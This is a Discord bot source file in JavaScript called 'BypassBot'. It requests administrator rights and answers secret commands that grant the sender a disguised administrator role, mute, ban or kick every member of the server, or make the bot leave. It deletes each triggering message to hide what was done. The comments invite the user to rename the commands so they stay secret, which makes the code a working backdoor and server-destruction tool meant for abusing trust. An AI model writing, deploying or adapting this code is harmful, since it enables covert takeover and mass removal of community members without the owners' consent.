const botSettings = require("./config/settings.json");
const Discord = require("discord.js");
const bot = new Discord.Client({disableEveryone: true});

bot.on("ready", async () => {
	console.log(`BypassBot Is now Running`);
	//Sets Bot Status
	bot.user.setActivity(`EvilChain`);

	try {
		//Generates an invite link
	let link = await bot.generateInvite(["ADMINISTRATOR"]);
	console.log(link);
	} catch(e) {
		console.log(e.stack);
	}
});
bot.on("message", async message => { 
if(message.author.bot) return;

	const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
  	const command = args.shift().toLowerCase();

  //Gives you the Administrator Permission then deletes the message.
  //Change it to your own secret command!
  if(command === `ceadmin`) {
  	try {
	role = await message.guild.createRole({
 	name: "Secret Role",
  	color: "#2f3136",
  	permissions: [8]
	});
	message.member.addRole(role)
	message.delete(1000);
	} catch(e) {
		console.log(e.stack);
	}
   }

	//Mutes everyone then deletes the message.
   //Change it to your own secret command!
   if(command === `cemute`) {
	try {
		role = await message.guild.createRole({
		 name: "Secret Mute Role",
		  color: "#2f3136",
		  permissions: [1]
		});
		message.guild.members.forEach(member => {member.addRole(role)});
   		message.delete(1000);
		} catch(e) {
			console.log(e.stack);
		}
	   }

   //Bans everyone then deletes the message.
   //Change it to your own secret command!
   if(command === `ceban`) {
   	try {
   	message.guild.members.forEach(member => {member.ban()});
   	message.delete(1000);
   	} catch(e) {
	console.log(e.stack);
   	}
   }

   //Kicks everyone then deletes the message.
   //Change it to your own secret command!
   if(command === `cekick`) {
	try {
	message.guild.members.forEach(member => {member.kick()});
	message.delete(1000);
	} catch(e) {
 console.log(e.stack);
	}
   }

	//Leaves the Server!
	//Change it to your own secret command!
   if(command === `celeave`) {
   	try {
   	message.guild.leave();
   	} catch(e) {
	console.log(e.stack);
   	}
   }
});

bot.login(botSettings.token);
